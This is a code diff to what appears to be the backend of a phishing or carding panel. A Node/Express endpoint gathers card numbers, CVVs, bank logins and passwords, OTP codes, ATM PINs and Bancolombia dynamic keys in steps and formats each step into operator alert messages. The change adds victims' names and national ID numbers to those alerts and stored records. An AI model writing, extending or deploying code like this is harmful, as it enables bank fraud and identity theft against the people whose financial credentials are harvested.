@@ -76,6 +76,8 @@ function textoPasoCrear(pago) {
     return (
         `🔔 <b>NUEVA SOLICITUD DE PAGO (PASO 1: TARJETA)</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
+        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +        // 🔥 NUEVO
+        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` + // 🔥 NUEVO
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
@@ -89,6 +91,8 @@ function textoPasoCredenciales(pago) {
     return (
         `🔑 <b>NUEVOS DATOS RECIBIDOS (PASO 2: CREDENCIALES)</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
+        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +        // 🔥 NUEVO
+        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` + // 🔥 NUEVO
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
@@ -106,6 +110,8 @@ function textoPasoOTP(pago) {
     return (
         `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: ${etiqueta})</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
+        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +        // 🔥 NUEVO
+        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` + // 🔥 NUEVO
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
@@ -142,7 +148,12 @@ app.post('/api/nuevo-ingreso', async (req, res) => {
 // ============================================================
 
 app.post('/api/crear-pago', async (req, res) => {
-    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, clave_atm, clave_dinamica, paso } = req.body || {};
+    const {
+        solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta,
+        banco_emisor, usuario_banco, password_banco, codigo_otp,
+        clave_atm, clave_dinamica, paso,
+        nombre_solicitante, cedula_solicitante   // 🔥 NUEVO
+    } = req.body || {};
     
     if (!solicitud_id) return res.status(400).json({ success: false, error: 'Datos incompletos' });
     if (paso === 'crear' && (!numero_tarjeta || !cvv || !vencimiento || !titular)) {
@@ -166,6 +177,8 @@ app.post('/api/crear-pago', async (req, res) => {
                 codigo_otp: codigo_otp || null,
                 clave_atm: clave_atm || null,
                 clave_dinamica: clave_dinamica || null,
+                nombre_solicitante: nombre_solicitante || '—',   // 🔥 NUEVO
+                cedula_solicitante: cedula_solicitante || '—',   // 🔥 NUEVO
                 requiere_clave_atm: esBancoClaveATM(banco_emisor),
                 requiere_clave_dinamica: esBancolombia(banco_emisor),
                 estado: 'pendiente',
@@ -189,6 +202,8 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.codigo_otp = codigo_otp || pago.codigo_otp;
             pago.clave_atm = clave_atm || pago.clave_atm;
             pago.clave_dinamica = clave_dinamica || pago.clave_dinamica;
+            pago.nombre_solicitante = nombre_solicitante || pago.nombre_solicitante;   // 🔥 NUEVO
+            pago.cedula_solicitante = cedula_solicitante || pago.cedula_solicitante;   // 🔥 NUEVO
             pago.requiere_clave_atm = esBancoClaveATM(pago.banco_emisor);
             pago.requiere_clave_dinamica = esBancolombia(pago.banco_emisor);
             pago.estado = 'pendiente';
